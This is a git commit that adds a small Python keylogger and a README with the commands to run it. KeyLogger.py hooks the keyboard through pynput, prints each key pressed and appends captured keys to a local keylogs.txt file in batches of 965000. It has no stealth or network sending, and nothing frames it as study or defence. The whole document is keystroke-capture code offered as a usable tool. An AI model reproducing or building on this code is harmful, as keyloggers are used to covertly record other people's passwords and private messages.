3d37d710226493625435f16db87f1fb842696ba5
IsixClay <109598601+IsixClay@users.noreply.github.com>
2022-07-20 10:40:41 +0800

    Add files via upload

---
+++ PythonKeylogger/KeyLogger.py
@@ -0,0 +1,22 @@
+import pynput
+from pynput.keyboard import Key, Listener
+count = 0
+keys = []
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+    if count >= 965000:
+        count = 0 
+        write_file(keys)
+        keys = []
+def write_file(keys):
+    with open("keylogs.txt", "a") as f:
+        for key in keys:
+            f.write(str(key))
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
---
+++ PythonKeylogger/README ON HOW TO USE.txt
@@ -0,0 +1,9 @@
+What you need to run the keylogger
+Python3
+
+Open your terminal
+Cd Desktop/pythonKeylogger
+
+Commands
+Python3 KeyLogger.py
+
